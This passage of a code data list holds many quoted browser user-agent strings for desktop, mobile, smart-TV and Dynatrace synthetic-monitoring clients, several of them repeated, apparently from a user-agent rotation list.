"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 TeslaBrowser/109.0.5414.75',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Whale/3.19.166.16 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/90.0.4480.84',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; Ultra Shine) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2128.0 OMI/4.8.0.129.Driver3.34, HbbTV/1.1.1 _TV_MT5806/201.003.193.001 (Philips, PUS7805, wired) CE-HTML/1.0 NETTV/4.6.0.2 SignOn/2.0 SmartTvA/5.0.0 WH1.0 en',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5772271339651569436 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466689893 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7865156642124093568 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6670751412956561496 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4561993359 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1845925232077549528 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1261276775280332682 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7810421046257064829 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8492051667383076268 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825080150562520833 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466718264 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v9115122683762782470 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562017263 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3868737290396490733 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v697612484780489074 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8352206510814970335 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2496106158381954575 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1963937732068003945 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6911884164551000505 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562088966 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1614683479483188728 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v9072378626783597796 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2877543591798990017 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466812979 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5523782189735053614 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9047047070013589437 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v561687782311054040 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466831043 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2759418202117184174 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2348282376621666327 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562112209 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4832822234644260482 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8013439855011271596 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7458889217659953098 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2589944954845346012 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1759747179826740674 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466859412 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562136107 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v180382763332506508 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
